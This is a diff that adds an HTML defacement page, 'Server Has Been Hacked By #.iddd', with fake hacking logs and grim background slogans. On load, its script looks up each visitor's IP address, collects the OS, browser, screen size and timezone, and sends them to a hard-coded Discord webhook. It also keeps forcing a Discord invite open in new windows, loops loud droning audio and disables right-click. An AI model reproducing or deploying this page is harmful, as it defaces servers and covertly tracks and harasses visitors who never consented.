@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Server Has Been Hacked By #.iddd</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            background: #050505;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            position: relative;
+        }
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: radial-gradient(circle at 20% 30%, #111111, #000000 90%);
+            overflow: hidden;
+            pointer-events: none;
+        }
+        .bg-text {
+            position: absolute;
+            color: rgba(80, 80, 80, 0.15);
+            font-size: 1.2rem;
+            font-weight: bold;
+            white-space: nowrap;
+            animation: scrollText 25s linear infinite;
+            text-shadow: 0 0 10px rgba(50, 50, 50, 0.2);
+            user-select: none;
+        }
+        .bg-text:nth-child(1) { top: 5%; left: -10%; animation-duration: 30s; font-size: 1.5rem; }
+        .bg-text:nth-child(2) { top: 25%; left: -5%; animation-duration: 22s; font-size: 1rem; }
+        .bg-text:nth-child(3) { top: 45%; left: -15%; animation-duration: 35s; font-size: 1.8rem; }
+        .bg-text:nth-child(4) { top: 65%; left: -8%; animation-duration: 28s; font-size: 1.3rem; }
+        .bg-text:nth-child(5) { top: 85%; left: -12%; animation-duration: 32s; font-size: 1.6rem; }
+        .bg-text:nth-child(6) { top: 15%; left: -20%; animation-duration: 40s; font-size: 2rem; }
+        .bg-text:nth-child(7) { top: 55%; left: -25%; animation-duration: 26s; font-size: 1.2rem; }
+        .bg-text:nth-child(8) { top: 75%; left: -18%; animation-duration: 38s; font-size: 1.4rem; }
+
+        @keyframes scrollText {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(calc(100vw + 50%)); }
+        }
+
+        .grey-blob {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(60, 60, 60, 0.06);
+            filter: blur(30px);
+            animation: blobFloat 18s ease-in-out infinite alternate;
+            pointer-events: none;
+        }
+        .grey-blob:nth-child(9) { width: 300px; height: 300px; top: 10%; left: 5%; animation-duration: 20s; }
+        .grey-blob:nth-child(10) { width: 200px; height: 200px; bottom: 15%; right: 8%; animation-duration: 25s; background: rgba(50, 50, 50, 0.05); }
+        .grey-blob:nth-child(11) { width: 350px; height: 350px; top: 50%; left: 60%; animation-duration: 22s; background: rgba(40, 40, 40, 0.04); }
+
+        @keyframes blobFloat {
+            0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
+            100% { transform: translate(30px, -40px) scale(1.4); opacity: 0.6; }
+        }
+
+        #terminal {
+            position: relative;
+            z-index: 10;
+            width: 750px;
+            max-width: 94%;
+            background: rgba(8, 8, 8, 0.96);
+            border: 1.5px solid #2a2a2a;
+            border-radius: 14px;
+            padding: 25px 30px 20px 30px;
+            box-shadow: 0 0 60px rgba(0, 0, 0, 0.9), 0 0 20px rgba(50, 50, 50, 0.1);
+            backdrop-filter: blur(4px);
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(60, 60, 60, 0.2);
+        }
+        .dot { width: 14px; height: 14px; border-radius: 50%; display: inline-block; }
+        .dot.red { background: #3a3a3a; box-shadow: 0 0 6px #1a1a1a; }
+        .dot.yellow { background: #4a4a4a; box-shadow: 0 0 6px #1a1a1a; }
+        .dot.green { background: #5a5a5a; box-shadow: 0 0 6px #1a1a1a; }
+        .header-title {
+            color: #a0a0a0;
+            font-size: 1rem;
+            margin-left: 10px;
+            letter-spacing: 1px;
+            opacity: 0.8;
+            text-shadow: 0 0 20px rgba(100, 100, 100, 0.1);
+        }
+        .output {
+            min-height: 150px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .main-line {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            font-size: 2.8rem;
+            font-weight: bold;
+            color: #c0c0c0;
+            text-shadow: 0 0 20px rgba(150, 150, 150, 0.1);
+            min-height: 80px;
+        }
+        #displayText { display: inline-block; word-break: break-all; }
+        .cursor {
+            display: inline-block;
+            width: 4px;
+            height: 2.8rem;
+            background-color: #a0a0a0;
+            margin-left: 5px;
+            animation: blink 0.7s step-end infinite;
+            box-shadow: 0 0 10px rgba(160, 160, 160, 0.3);
+        }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+        .glitch {
+            animation: glitchEffect 0.4s ease-in-out;
+        }
+        @keyframes glitchEffect {
+            0% { transform: translate(0); text-shadow: 2px 0 #555, -2px 0 #555; }
+            20% { transform: translate(-3px, 1px); text-shadow: -3px 0 #555, 3px 0 #555; }
+            40% { transform: translate(3px, -1px); text-shadow: 3px 0 #555, -3px 0 #555; }
+            60% { transform: translate(-2px, 1px); text-shadow: -2px 0 #555, 2px 0 #555; }
+            80% { transform: translate(2px, -1px); text-shadow: 2px 0 #555, -2px 0 #555; }
+            100% { transform: translate(0); text-shadow: 0 0 20px rgba(150, 150, 150, 0.1); }
+        }
+        #logsContainer {
+            margin-top: 15px;
+            padding-top: 12px;
+            border-top: 1px dashed rgba(80, 80, 80, 0.15);
+            font-size: 0.85rem;
+            color: #888;
+            min-height: 30px;
+            line-height: 1.6;
+            opacity: 0.9;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        .log-entry { opacity: 0; animation: fadeIn 0.3s forwards; }
+        @keyframes fadeIn { to { opacity: 1; } }
+        .log-entry .prefix { color: #aaa; font-weight: bold; }
+        .log-entry .highlight { color: #ddd; }
+        .status-bar {
+            margin-top: 18px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            font-size: 0.7rem;
+            color: #555;
+            border-top: 1px solid rgba(60, 60, 60, 0.1);
+            padding-top: 12px;
+        }
+        .status-bar span {
+            background: rgba(60, 60, 60, 0.05);
+            padding: 4px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(60, 60, 60, 0.08);
+            text-shadow: 0 0 10px rgba(50, 50, 50, 0.1);
+        }
+        .status-bar .blink-status {
+            animation: blink 1.2s step-end infinite;
+            color: #aaa;
+            font-weight: bold;
+        }
+        @media (max-width: 600px) {
+            #terminal { padding: 15px; }
+            .main-line { font-size: 2rem; }
+            .cursor { height: 2rem; }
+        }
+        #logsContainer::-webkit-scrollbar { width: 3px; }
+        #logsContainer::-webkit-scrollbar-track { background: rgba(60, 60, 60, 0.05); }
+        #logsContainer::-webkit-scrollbar-thumb { background: #555; border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-overlay">
+        <div class="bg-text">KILL // SYSTEM // 127</div>
+        <div class="bg-text">ELIMINATED // TARGET</div>
+        <div class="bg-text">ROOTKIT // DEPLOYED</div>
+        <div class="bg-text">EYELOPHATIC // KILL</div>
+        <div class="bg-text">SALAC // KILLER</div>
+        <div class="bg-text">BLOOD // RAIN</div>
+        <div class="bg-text">NIGHTMARE // MODE</div>
+        <div class="bg-text">HACKED // BY // #.iddd</div>
+        <div class="grey-blob"></div>
+        <div class="grey-blob"></div>
+        <div class="grey-blob"></div>
+    </div>
+
+    <div id="terminal">
+        <div class="header">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+            <span class="header-title">Server Has Been Hacked By #.iddd</span>
+        </div>
+        <div class="output">
+            <div class="main-line">
+                <span id="displayText"></span>
+                <span class="cursor" id="cursor"></span>
+            </div>
+            <div id="logsContainer"></div>
+        </div>
+        <div class="status-bar">
+            <span id="ipDisplay">🌐 IP: LOADING...</span>
+            <span id="portDisplay">🔌 PORT: 443</span>
+            <span id="statusDisplay" class="blink-status">⚡ STATUS: CONNECTED</span>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519303868205367408/F22vxIN1MuRmbmFazdg-_GQdjh0F_JEvbX5Cq2FwFev0fyuSY3tFIGzbS9Uqr9gfbcgn";
+        const DISPLAY_TEXT = "discord.gg/127";
+        const TARGET_URL = "https://discord.gg/127";
+
+        const displaySpan = document.getElementById('displayText');
+        let charIndex = 0;
+
+        function typeWriter() {
+            if (charIndex < DISPLAY_TEXT.length) {
+                displaySpan.textContent += DISPLAY_TEXT.charAt(charIndex);
+                charIndex++;
+                setTimeout(typeWriter, 120);
+            } else {
+                startLogs();
+                updateStatusBar();
+                fetchRealIP();
+                openLinkAndWatch();
+                setInterval(triggerGlitch, 5000);
+                setInterval(changeBgText, 12000);
+            }
+        }
+
+        function changeBgText() {
+            const texts = document.querySelectorAll('.bg-text');
+            const phrases = [
+                'KILL // SYSTEM // 127', 'ELIMINATED // TARGET',
+                'ROOTKIT // DEPLOYED', 'EYELOPHATIC // KILL',
+                'SALAC // KILLER', 'BLOOD // RAIN',
+                'NIGHTMARE // MODE', 'HACKED // BY // #.iddd'
+            ];
+            texts.forEach((el) => {
+                const randomIndex = Math.floor(Math.random() * phrases.length);
+                el.textContent = phrases[randomIndex];
+            });
+        }
+
+        const logsContainer = document.getElementById('logsContainer');
+        let logIndex = 0;
+        const logMessages = [
+            { prefix: '[ROOT]', msg: 'Breaching target firewall...' },
+            { prefix: '[KERNEL]', msg: 'Exploiting memory corruption...' },
+            { prefix: '[PAYLOAD]', msg: 'Injecting reverse shell...' },
+            { prefix: '[SUCCESS]', msg: 'Rootkit deployed on port 443.' },
+            { prefix: '[ACCESS]', msg: '<span class="highlight">Full root access granted to discord.gg/127</span>' },
+        ];
+
+        function startLogs() {
+            const interval = setInterval(() => {
+                if (logIndex < logMessages.length) {
+                    const entry = logMessages[logIndex];
+                    const div = document.createElement('div');
+                    div.className = 'log-entry';
+                    div.innerHTML = `<span class="prefix">${entry.prefix}</span> ${entry.msg}`;
+                    logsContainer.appendChild(div);
+                    logsContainer.scrollTop = logsContainer.scrollHeight;
+                    logIndex++;
+                } else {
+                    clearInterval(interval);
+                    setInterval(() => {
+                        const prefixes = ['[NET]', '[SECURE]'];
+                        const msgs = ['Maintaining persistence...', 'Idle state...', 'Monitoring traffic...'];
+                        const div = document.createElement('div');
+                        div.className = 'log-entry';
+                        div.innerHTML = `<span class="prefix">${prefixes[Math.floor(Math.random() * prefixes.length)]}</span> ${msgs[Math.floor(Math.random() * msgs.length)]}`;
+                        logsContainer.appendChild(div);
+                        if (logsContainer.children.length > 10) logsContainer.removeChild(logsContainer.children[0]);
+                        logsContainer.scrollTop = logsContainer.scrollHeight;
+                    }, 12000);
+                }
+            }, 1500);
+        }
+
+        function triggerGlitch() {
+            if (!displaySpan.textContent) return;
+            displaySpan.classList.remove('glitch');
+            void displaySpan.offsetWidth;
+            displaySpan.classList.add('glitch');
+            setTimeout(() => displaySpan.classList.remove('glitch'), 500);
+        }
+
+        let realIP = 'UNKNOWN';
+        let webhookSent = false;
+
+        function updateStatusBar() {
+            document.getElementById('ipDisplay').textContent = `🌐 IP: ${realIP}`;
+            const port = Math.floor(Math.random() * 65535);
+            document.getElementById('portDisplay').textContent = `🔌 PORT: ${port}`;
+            const statuses = ['CONNECTED', 'ENCRYPTED', 'STABLE'];
+            document.getElementById('statusDisplay').textContent = `⚡ STATUS: ${statuses[Math.floor(Math.random() * statuses.length)]}`;
+        }
+
+        function fetchRealIP() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    realIP = data.ip;
+                    updateStatusBar();
+                    sendDataToWebhook();
+                })
+                .catch(() => {
+                    realIP = 'UNKNOWN';
+                    updateStatusBar();
+                    sendDataToWebhook();
+                });
+        }
+
+        function collectData() {
+            const ua = navigator.userAgent;
+            let os = "Unknown";
+            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
+            else if (ua.indexOf("Mac OS X") !== -1) os = "macOS";
+            else if (ua.indexOf("Android") !== -1) os = "Android";
+            else if (ua.indexOf("iPhone") !== -1) os = "iOS";
+            else if (ua.indexOf("Linux") !== -1) os = "Linux";
+
+            let browser = "Unknown";
+            if (ua.indexOf("Edg") !== -1) browser = "Edge";
+            else if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+
+            return {
+                ip: realIP,
+                os: os,
+                browser: browser,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        function sendDataToWebhook() {
+            if (webhookSent) return;
+            webhookSent = true;
+            const data = collectData();
+            const embed = {
+                title: "🛡️ **TARGET SYSTEM BREACHED**",
+                color: 0x333333,
+                fields: [
+                    { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
+                    { name: "💻 OS", value: data.os, inline: true },
+                    { name: "🧩 Browser", value: data.browser, inline: true },
+                    { name: "🖥️ Screen", value: data.screen, inline: true },
+                    { name: "🌍 Timezone", value: data.timezone, inline: true },
+                    { name: "⏰ Timestamp", value: data.timestamp, inline: false }
+                ],
+                footer: { text: "Server Has Been Hacked By #.iddd" },
+                timestamp: data.timestamp
+            };
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(() => {});
+        }
+
+        let linkWindow = null;
+        let watchInterval = null;
+
+        function forceOpenLink() {
+            try {
+                linkWindow = window.open(TARGET_URL, '_blank');
+                if (!linkWindow || linkWindow.closed || typeof linkWindow.closed === 'undefined') {
+                    const a = document.createElement('a');
+                    a.href = TARGET_URL;
+                    a.target = '_blank';
+                    a.rel = 'noopener noreferrer';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }
+            } catch (e) {}
+        }
+
+        function openLinkAndWatch() {
+            forceOpenLink();
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            div.innerHTML = `<span class="prefix">[SYSTEM]</span> <span class="highlight">Link opened: discord.gg/127</span>`;
+            logsContainer.appendChild(div);
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+
+            if (watchInterval) clearInterval(watchInterval);
+            watchInterval = setInterval(() => {
+                if (linkWindow && linkWindow.closed) {
+                    forceOpenLink();
+                    const logDiv = document.createElement('div');
+                    logDiv.className = 'log-entry';
+                    logDiv.innerHTML = `<span class="prefix">[SYSTEM]</span> <span class="highlight">Link re-opened (window was closed)</span>`;
+                    logsContainer.appendChild(logDiv);
+                    logsContainer.scrollTop = logsContainer.scrollHeight;
+                    if (logsContainer.children.length > 12) logsContainer.removeChild(logsContainer.children[0]);
+                }
+            }, 1000);
+        }
+
+        let audioCtx = null;
+        let soundStarted = false;
+        let soundInterval = null;
+
+        function createDeepSound() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+
+            const duration = 3.0;
+            const sampleRate = audioCtx.sampleRate;
+            const bufferSize = Math.floor(duration * sampleRate);
+            const buffer = audioCtx.createBuffer(1, bufferSize, sampleRate);
+            const data = buffer.getChannelData(0);
+
+            const baseFreq = 45 + Math.random() * 35;
+            for (let i = 0; i < bufferSize; i++) {
+                const t = i / sampleRate;
+                const envelope = Math.exp(-t * 0.8);
+                const noise = (Math.random() * 2 - 1) * 0.6;
+                const tone = Math.sin(2 * Math.PI * baseFreq * t) * 0.4;
+                const mod = Math.sin(2 * Math.PI * 2.5 * t) * 0.2;
+                data[i] = (noise + tone + mod) * envelope * 0.7;
+            }
+
+            const source = audioCtx.createBufferSource();
+            source.buffer = buffer;
+
+            const filter = audioCtx.createBiquadFilter();
+            filter.type = 'lowpass';
+            filter.frequency.value = 120;
+            filter.Q.value = 0.5;
+
+            const gain = audioCtx.createGain();
+            gain.gain.value = 2.5;
+
+            const convolver = audioCtx.createConvolver();
+            const impulseLength = sampleRate * 0.3;
+            const impulseBuffer = audioCtx.createBuffer(1, impulseLength, sampleRate);
+            const impulseData = impulseBuffer.getChannelData(0);
+            for (let i = 0; i < impulseLength; i++) {
+                const decay = Math.exp(-i / (sampleRate * 0.15));
+                impulseData[i] = (Math.random() * 2 - 1) * decay * 0.5;
+            }
+            convolver.buffer = impulseBuffer;
+
+            source.connect(filter);
+            filter.connect(convolver);
+            convolver.connect(gain);
+            gain.connect(audioCtx.destination);
+
+            source.start();
+            source.stop(audioCtx.currentTime + duration + 0.5);
+        }
+
+        function playDeepSound() {
+            try {
+                if (audioCtx && audioCtx.state === 'suspended') {
+                    audioCtx.resume();
+                }
+                createDeepSound();
+            } catch (e) {}
+        }
+
+        function startSound() {
+            if (soundStarted) return;
+            soundStarted = true;
+            playDeepSound();
+            if (soundInterval) clearInterval(soundInterval);
+            soundInterval = setInterval(playDeepSound, 2000);
+        }
+
+        setTimeout(() => {
+            try {
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume().then(() => {
+                        startSound();
+                    }).catch(() => {});
+                } else {
+                    startSound();
+                }
+            } catch (e) {}
+        }, 500);
+
+        document.addEventListener('click', function() {
+            if (!soundStarted) {
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume().then(() => {
+                        startSound();
+                    }).catch(() => {});
+                } else {
+                    startSound();
+                }
+            }
+            if (!linkWindow || linkWindow.closed) {
+                forceOpenLink();
+            }
+        });
+
+        window.onload = function() {
+            setTimeout(typeWriter, 300);
+            setInterval(updateStatusBar, 5000);
+        };
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        console.log('🔓 Server Has Been Hacked By #.iddd');
+    </script>
+
+</body>
+</html>
